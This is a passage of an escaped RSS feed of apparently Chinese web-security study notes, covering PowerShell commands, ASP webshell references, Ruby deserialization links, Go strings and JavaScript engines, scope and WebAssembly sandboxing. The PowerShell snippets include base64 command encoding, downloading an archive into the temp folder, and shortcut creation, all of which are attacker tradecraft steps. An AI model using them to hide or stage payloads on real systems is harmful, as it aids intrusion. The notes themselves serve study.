class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;WindowStyle = 1&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Description = &lt;span class=&#34;token string&#34;&gt;&#34;test.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ShortCut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Save&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编码&#34;&gt;#&lt;/a&gt; 编码&lt;/h2&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$OriginalCommand&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;#&amp;#123;powershell_command&amp;#125;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Bytes&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Text.Encoding]&lt;/span&gt;::Unicode&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;GetBytes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$OriginalCommand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$EncodedCommand&lt;/span&gt; =&lt;span class=&#34;token namespace&#34;&gt;[Convert]&lt;/span&gt;::ToBase64String&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;别名&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;alias&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Invoke-WebRequest &amp;quot;https://example.com/test.zip&amp;quot; -OutFile &amp;quot;$env:TEMP\test.zip&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解压缩&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Expand-Archive $env:TEMP\test.zip $env:TEMP\test -Force&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动进程  &lt;code&gt;Start-Process calc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;停止进程  &lt;code&gt;Stop-Process -ID $pid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新建文件  &lt;code&gt;New-Item #&amp;#123;file_path&amp;#125; -Force | Out-Null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;设置文件内容  &lt;code&gt;Set-Content -Path #&amp;#123;file_path&amp;#125; -Value &amp;quot;#&amp;#123;Content&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;追加文件内容  &lt;code&gt;Add-Content -Path #&amp;#123;file_path&amp;#125; -Value &amp;quot;#&amp;#123;Content&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;复制文件  &lt;code&gt;Copy-Item src dst&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;删除文件  &lt;code&gt;Remove-Item #&amp;#123;outputfile&amp;#125; -Force -ErrorAction Ignore&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;子目录  &lt;code&gt;Get-ChildItem #&amp;#123;file_path&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取服务  &lt;code&gt;Get-Service -Name &amp;quot;#&amp;#123;service_name&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启动服务  &lt;code&gt;Start-Service -Name &amp;quot;#&amp;#123;service_name&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;停止服务  &lt;code&gt;Stop-Service -Name &amp;quot;#&amp;#123;service_name&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;删除服务  &lt;code&gt;Remove-Service -Name &amp;quot;#&amp;#123;service_name&amp;#125;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取 WMI 支持  &lt;code&gt;Get-WmiObject -list&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vcG93ZXJzaGVsbC8=&#34;&gt;PowerShell 官方文档&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/ASP/</guid>
            <title>ASP</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/ASP/</link>
            <category>ASP</category>
            <pubDate>Mon, 28 Nov 2022 10:36:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;ASP 是动态服务器页面 (Active Server Page)，是微软开发的类似 CGI 脚本程序的一种应用，其网页文件的格式是  &lt;code&gt;.asp&lt;/code&gt;  。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTGl0dGxlSGFubi9wLzUwMTY5OTkuaHRtbA==&#34;&gt;Deformity ASP/ASPX Webshell、Webshell Hidden Learning&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Ruby/</guid>
            <title>Ruby</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Ruby/</link>
            <category>Ruby</category>
            <pubDate>Mon, 28 Nov 2022 10:36:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZWx0dGFtLmNvbS5hdS9ibG9nL3J1YnktZGVzZXJpYWxpemF0aW9uLw==&#34;&gt;ruby deserialization&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRUNMd01iYnJmOWxXWGtoYlVlcmdYZw==&#34;&gt;Ruby 安全漫谈&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Golang/</guid>
            <title>Golang</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Golang/</link>
            <category>Golang</category>
            <pubDate>Mon, 28 Nov 2022 10:34:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;golang-runtime&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#golang-runtime&#34;&gt;#&lt;/a&gt; Golang Runtime&lt;/h1&gt;
&lt;p&gt;Go 中的线程被称为 Goroutine 或 G，内核线程被称为 M。这些 G 被调度到 M 上，即所谓的 G：M 线程模型，或更常用的 M：N 线程模型，用户空间线程或 green 线程模型。&lt;/p&gt;
&lt;h1 id=&#34;字符串处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字符串处理&#34;&gt;#&lt;/a&gt; 字符串处理&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Go 源代码始终为 UTF-8&lt;/li&gt;
&lt;li&gt;代表 Unicode 码点的字节序列称为  &lt;code&gt;rune&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Go 不保证字符串中的字符被规范化&lt;/li&gt;
&lt;li&gt;字符串可以包含任意字节&lt;/li&gt;
&lt;li&gt;字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmdvbGFuZy5vcmcvc3RyaW5ncw==&#34;&gt;Strings, bytes, runes and characters in Go&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/</guid>
            <title>JavaScript</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>沙箱</category>
            <category>JavaScript</category>
            <pubDate>Mon, 28 Nov 2022 09:50:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ecmascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ecmascript&#34;&gt;#&lt;/a&gt; ECMAScript&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript 或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。&lt;/p&gt;
&lt;h2 id=&#34;版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#版本&#34;&gt;#&lt;/a&gt; 版本&lt;/h2&gt;
&lt;p&gt;1997 年 6 月，首版发布。1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。&lt;/p&gt;
&lt;p&gt;2009 年 12 月，第五版发布，新增 “严格模式（strict mode）”，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。&lt;/p&gt;
&lt;p&gt;2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python 风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。&lt;/p&gt;
&lt;p&gt;2016 年 6 月，ECMAScript 2016（ES2016）发布，引入  &lt;code&gt;Array.prototype.includes&lt;/code&gt;  、指数运算符、SIMD 等新特性。&lt;/p&gt;
&lt;p&gt;2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。&lt;/p&gt;
&lt;p&gt;2018 年 6 月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。&lt;/p&gt;
&lt;h2 id=&#34;es6-特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#es6-特性&#34;&gt;#&lt;/a&gt; ES6 特性&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;const&lt;/code&gt;  /  &lt;code&gt;let&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;模板字面量&lt;/li&gt;
&lt;li&gt;解构
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[a, b] = [10, 20]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对象字面量简写法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;for...of&lt;/code&gt;  循环&lt;/li&gt;
&lt;li&gt;&lt;code&gt;...xxx&lt;/code&gt;  展开运算符&lt;/li&gt;
&lt;li&gt;可变参数&lt;/li&gt;
&lt;li&gt;箭头函数&lt;/li&gt;
&lt;li&gt;默认参数函数&lt;/li&gt;
&lt;li&gt;默认值与解构&lt;/li&gt;
&lt;li&gt;类&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引擎&#34;&gt;#&lt;/a&gt; 引擎&lt;/h1&gt;
&lt;h2 id=&#34;v8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#v8&#34;&gt;#&lt;/a&gt; V8&lt;/h2&gt;
&lt;p&gt;V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中 Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。&lt;/p&gt;
&lt;h2 id=&#34;spidermonkey&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spidermonkey&#34;&gt;#&lt;/a&gt; SpiderMonkey&lt;/h2&gt;
&lt;p&gt;SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。&lt;/p&gt;
&lt;h2 id=&#34;javascriptcore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#javascriptcore&#34;&gt;#&lt;/a&gt; JavaScriptCore&lt;/h2&gt;
&lt;p&gt;JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。&lt;/p&gt;
&lt;h2 id=&#34;chakracore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chakracore&#34;&gt;#&lt;/a&gt; ChakraCore&lt;/h2&gt;
&lt;p&gt;ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。&lt;/p&gt;
&lt;h2 id=&#34;jscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jscript&#34;&gt;#&lt;/a&gt; JScript&lt;/h2&gt;
&lt;p&gt;JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。&lt;/p&gt;
&lt;h2 id=&#34;jerryscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jerryscript&#34;&gt;#&lt;/a&gt; JerryScript&lt;/h2&gt;
&lt;p&gt;JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。&lt;/p&gt;
&lt;h1 id=&#34;webassembly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webassembly&#34;&gt;#&lt;/a&gt; WebAssembly&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。&lt;/p&gt;
&lt;h2 id=&#34;执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行&#34;&gt;#&lt;/a&gt; 执行&lt;/h2&gt;
&lt;p&gt;虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。&lt;/p&gt;
&lt;p&gt;在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。 然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。&lt;/p&gt;
&lt;p&gt;虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。&lt;/p&gt;
&lt;p&gt;Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。 当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。 Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。&lt;/p&gt;
&lt;h2 id=&#34;安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全&#34;&gt;#&lt;/a&gt; 安全&lt;/h2&gt;
&lt;p&gt;Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保护用户免受由于无意的错误而导致漏洞的应用程序的侵害&lt;/li&gt;
&lt;li&gt;保护用户免受故意编写为恶意的应用程序的侵害&lt;/li&gt;
&lt;li&gt;为开发人员提供良好的缓解措施&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体的安全措施有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wasm 应用程序在沙箱内运行&lt;/li&gt;
&lt;li&gt;Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中&lt;/li&gt;
&lt;li&gt;间接函数调用受类型签名检查的约束&lt;/li&gt;
&lt;li&gt;调用堆栈受到保护，这意味着无法覆盖返回指针&lt;/li&gt;
&lt;li&gt;实现了控制流完整性，这意味着调用意外的函数将失败&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;作用域与闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与闭包&#34;&gt;#&lt;/a&gt; 作用域与闭包&lt;/h1&gt;
&lt;h2 id=&#34;作用域与作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与作用域链&#34;&gt;#&lt;/a&gt; 作用域与作用域链&lt;/h2&gt;
&lt;h3 id=&#34;作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域&#34;&gt;#&lt;/a&gt; 作用域&lt;/h3&gt;
&lt;p&gt;简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。&lt;/p&gt;
&lt;p&gt;作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数外面定义的变量拥有全局作用域&lt;/li&gt;
&lt;li&gt;未定义直接赋值的变量自动声明为拥有全局作用域&lt;/li&gt;
&lt;li&gt;window 对象的属性拥有全局作用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。&lt;/p&gt;
&lt;h3 id=&#34;作用域泄漏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域泄漏&#34;&gt;#&lt;/a&gt; 作用域泄漏&lt;/h3&gt;
&lt;p&gt;在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域提升var-hoisting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域提升var-hoisting&#34;&gt;#&lt;/a&gt; 作用域提升（var Hoisting）&lt;/h3&gt;
&lt;p&gt;在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为 Hoisting。例如下面这段代码等效于第二段代码&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token 